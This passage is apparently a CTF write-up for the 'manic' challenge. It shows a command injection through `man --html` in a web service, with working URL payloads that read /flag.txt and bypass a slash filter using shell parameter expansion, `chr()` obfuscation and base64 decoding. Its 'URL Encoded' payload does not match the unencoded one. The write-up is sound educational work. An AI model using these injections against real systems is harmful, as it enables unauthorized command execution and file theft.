+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lrwxrwxrwx &lt;span class="m">1&lt;/span> root root &lt;span class="m">29&lt;/span> Oct &lt;span class="m">28&lt;/span> 14:38 /usr/bin/www-browser -&amp;gt; /etc/alternatives/www-browser
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ ls -l /etc/alternatives/www-browser
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lrwxrwxrwx &lt;span class="m">1&lt;/span> root root &lt;span class="m">13&lt;/span> Oct &lt;span class="m">28&lt;/span> 14:38 /etc/alternatives/www-browser -&amp;gt; /usr/bin/lynx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So, theoretically, if I specify another binary that isn&amp;rsquo;t a browser, it should execute. I tried to do this locally and execute the &lt;code>ls&lt;/code> command, but it didn&amp;rsquo;t work. I don&amp;rsquo;t know the reason why but might be because it&amp;rsquo;s a different implementation of &lt;code>man&lt;/code> compared to the container&amp;rsquo;s &lt;code>man&lt;/code> binary.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">$ man --html&lt;span class="o">=&lt;/span>ls man
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man: &lt;span class="nb">command&lt;/span> exited with status 3: &lt;span class="o">(&lt;/span>&lt;span class="nb">cd&lt;/span> /tmp/hmanyFvR7I &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> /usr/libexec/man-db/zsoelim&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nb">cd&lt;/span> /tmp/hmanyFvR7I &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> /usr/libexec/man-db/manconv -f UTF-8:ISO-8859-1 -t UTF-8//IGNORE&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nb">cd&lt;/span> /tmp/hmanyFvR7I &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> preconv -e UTF-8&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nb">cd&lt;/span> /tmp/hmanyFvR7I &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> tbl&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nb">cd&lt;/span> /tmp/hmanyFvR7I &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> groff -mandoc -Thtml&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;em>EDIT: Someone mentioned it not working on local machine on discord after the CTF and hashkitten (the author) mentioned you need to install some packages.&lt;/em>&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/local_error_discussion.png"
+width="932"
+height="154"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/local_error_discussion_hu_ca6ae598e444a2ea.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/local_error_discussion_hu_e03001b4b4423c26.png 1024w"
+loading="lazy"
+alt="Local Error Discussion"
+class="gallery-image"
+data-flex-grow="605"
+data-flex-basis="1452px"
+>&lt;/p>
+&lt;p>I ran it in a local docker container instead, using the provided Dockerfile to match the exact environment and I was able to execute the &lt;code>ls&lt;/code> binary!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">$ docker build -t manic .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ docker run -it --entrypoint bash manic
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nobody@21aa2caa1ab3:/app$ man --html&lt;span class="o">=&lt;/span>ls man
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/tmp/hmandNHcO9/man.html
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="utilising-the-command-injection">Utilising the Command Injection
+&lt;/h4>&lt;p>Testing with a few other commands, I found that the command being executed will look like this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;BROWSER&amp;gt; &amp;lt;TMP_DIR&amp;gt;/&amp;lt;COMMAND&amp;gt;.html
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So &lt;code>man --html=ls man&lt;/code> will execute &lt;code>ls /tmp/&amp;lt;RANDOM_STRING&amp;gt;/man.html&lt;/code>.&lt;/p>
+&lt;p>You can also include arguments for your commands like &lt;code>man --html=&amp;quot;ls -l&amp;quot; man&lt;/code>&lt;/p>
+&lt;p>Now all we have to do is read the flag!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">man --html&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;cat /flag.txt&amp;#34;&lt;/span> man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Sure that works on the docker container, however, there&amp;rsquo;s a forward slash required in our payload! To bypass this, we identify that the command we specify in the HTML argument is safe from the &lt;code>subprocess.run&lt;/code> function&amp;rsquo;s safe argument passing, allowing us to do shell expansions. Therefore, we can specify a slash with parameter expansion as we know the first character of the env variable &lt;code>PATH&lt;/code> will be &amp;ldquo;/&amp;rdquo;:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="si">${&lt;/span>&lt;span class="nv">PATH&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">1&lt;/span>&lt;span class="si">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Our final command executed in the container will look like this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nobody@21aa2caa1ab3:/app$ man --html&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;cat &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">PATH&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">1&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">flag.txt&amp;#34;&lt;/span> man
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">oiccflag&lt;span class="o">{&lt;/span>test&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;!-- Creator : groff version 1.22.4 --&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;!-- CreationDate: Wed Feb &lt;span class="m">12&lt;/span> 13:47:14 &lt;span class="m">2025&lt;/span> --&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;!DOCTYPE html PUBLIC &lt;span class="s2">&amp;#34;-//W3C//DTD HTML 4.01 Transitional//EN&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;http://www.w3.org/TR/html4/loose.dtd&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;meta &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;generator&amp;#34;&lt;/span> &lt;span class="nv">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;groff -Thtml, see www.gnu.org&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;meta http-equiv&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span> &lt;span class="nv">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;text/html; charset=US-ASCII&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">... SNIPPED ...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ok now we got a PoC working in the container. Time to convert this in URL form:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/$/--html=&amp;#34;cat ${PATH:0:1}flag.txt&amp;#34;/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>When sending this we get the following error:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sh: 1: Syntax error: Missing &amp;#39;}&amp;#39;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sh: 1: 0: not found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sh: 1: 1}flag.txt: not found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man: couldn&amp;#39;t execute any browser from cat ${PATH:0:1}flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Weird, is it not expanding properly? I try with just &lt;code>${PATH}&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/$/--html=cat%20$%7BPATH%7Dflag.txt/man
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat: &amp;#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binflag.txt&amp;#39;: No such file or directory
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man: couldn&amp;#39;t execute any browser from cat ${PATH}flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ok it actually resolved the &lt;code>PATH&lt;/code> variable. It is known that the colons to extract substrings in parameter expansions don&amp;rsquo;t work in &lt;code>sh&lt;/code>, so maybe it&amp;rsquo;s executing in a primitive shell. Looking at the solution, it uses the &lt;code>%&lt;/code> operator which is used for pattern removal in parameter expansion. I can use this operator instead to remove the rest of the string to only give me &lt;code>/&lt;/code>. I can&amp;rsquo;t use &lt;code>PATH&lt;/code> though because it contains multiple forward slash characters. Let&amp;rsquo;s see what the value of &lt;code>PWD&lt;/code> is.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/$/--html=cat%20$%7BPWD%7Dflag.txt/man
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat: /appflag.txt: No such file or directory
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man: couldn&amp;#39;t execute any browser from cat ${PWD}flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>Note: &lt;code>PATH&lt;/code> and &lt;code>PWD&lt;/code> are well-known environment and shell variables. You can check out more common variables &lt;a class="link" href="https://www.digitalocean.com/community/tutorials/how-to-read-and-set-environmental-and-shell-variables-on-linux#common-environmental-and-shell-variables" target="_blank" rel="noopener"
+>here&lt;/a> but I prefer just executing the &lt;code>env&lt;/code> command in the docker container to see what&amp;rsquo;s available.&lt;/p>&lt;/blockquote>
+&lt;p>I can determine that &lt;code>PWD&lt;/code> is &lt;code>/app&lt;/code>. So if I do &lt;code>${PWD%app}&lt;/code>, this will result in just &lt;code>/&lt;/code>. The final payload is here:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/$/--html=cat${PWD%app}flag.txt/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>URL Encoded:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/$/--html=cat%20$%7BPWD%7Dflag.txt/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/final_payload.png"
+width="904"
+height="284"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/final_payload_hu_f8e1eb42849107e9.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/final_payload_hu_8f78f3f5779eeb0e.png 1024w"
+loading="lazy"
+alt="Final Payload"
+class="gallery-image"
+data-flex-grow="318"
+data-flex-basis="763px"
+>&lt;/p>
+&lt;p>At the very top is our lovely flag!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">oiccflag{i_wish_i_did_this_more_securely_10a287eb}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="other-command-injection-payloads">Other Command Injection Payloads
+&lt;/h4>&lt;p>I wanted to note a few other payloads that were posted in the discord which I thought were interesting.&lt;/p>
+&lt;h5 id="python">Python
+&lt;/h5>&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/python_payload.png"
+width="1382"
+height="138"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/python_payload_hu_9110837afe4381d4.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/python_payload_hu_62e27993448a5bbb.png 1024w"
+loading="lazy"
+alt="Python Payload"
+class="gallery-image"
+data-flex-grow="1001"
+data-flex-basis="2403px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://127.0.0.1:1337/-1/-Hpython%20-c%20&amp;#39;print(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())&amp;#39;%20%23/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Decoded URL:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://127.0.0.1:1337/-1/-Hpython -c &amp;#39;print(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())&amp;#39; #/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Output:&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/python_payload_output.png"
+width="633"
+height="194"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/python_payload_output_hu_656098f2215e839c.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/python_payload_output_hu_683e491f77d7cb40.png 1024w"
+loading="lazy"
+alt="Python Payload Output"
+class="gallery-image"
+data-flex-grow="326"
+data-flex-basis="783px"
+>&lt;/p>
+&lt;p>Python code:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">102&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">108&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">97&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">103&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">46&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">116&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">120&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">116&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Equivalent Python code&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/flag.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The use of the &lt;a class="link" href="https://docs.python.org/3/library/functions.html#chr" target="_blank" rel="noopener"
+>chr&lt;/a> function in Python is a common method to bypass character restrictions in Pyjails. In this case we are replacing the &amp;ldquo;/&amp;rdquo; character with &lt;code>chr(47)&lt;/code>.&lt;/p>
+&lt;h5 id="base64">Base64
+&lt;/h5>&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload.png"
+width="798"
+height="67"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_hu_e0dba208bb7ddb00.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_hu_5ef23387fe1cd044.png 1024w"
+loading="lazy"
+alt="Base64 Payload"
+class="gallery-image"
+data-flex-grow="1191"
+data-flex-basis="2858px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{base_url}/;/--html=&amp;#34;$(echo%20\&amp;#39;L2ZsYWcudHh0\&amp;#39;|base64%20-d)&amp;#34;/;/-l/;/app.py
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/;/--html=%22$(echo%20&amp;#39;L2ZsYWcudHh0&amp;#39;|base64%20-d)%22/;/-l/;/app.py
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Decoded URL:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{base_url}/;/--html=&amp;#34;$(echo &amp;#39;L2ZsYWcudHh0&amp;#39;|base64 -d)&amp;#34;/;/-l/;/app.py
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Output:&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_output.png"
+width="886"
+height="202"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_output_hu_f197e599449ebedf.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_output_hu_a2efd2934500bb7d.png 1024w"
+loading="lazy"
+alt="Base64 Payload Output"
+class="gallery-image"
+data-flex-grow="438"
+data-flex-basis="1052px"
+>&lt;/p>
+&lt;p>Base64 allows the forward slash character to be encoded:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">L2ZsYWcudHh0 -&amp;gt; (base64 decode) -&amp;gt; /flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Not sure why the &lt;code>-l app.py&lt;/code> is there tbh. Might have been artifacts from previous injections. It still works but doesn&amp;rsquo;t seem like it&amp;rsquo;s required. The following works:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
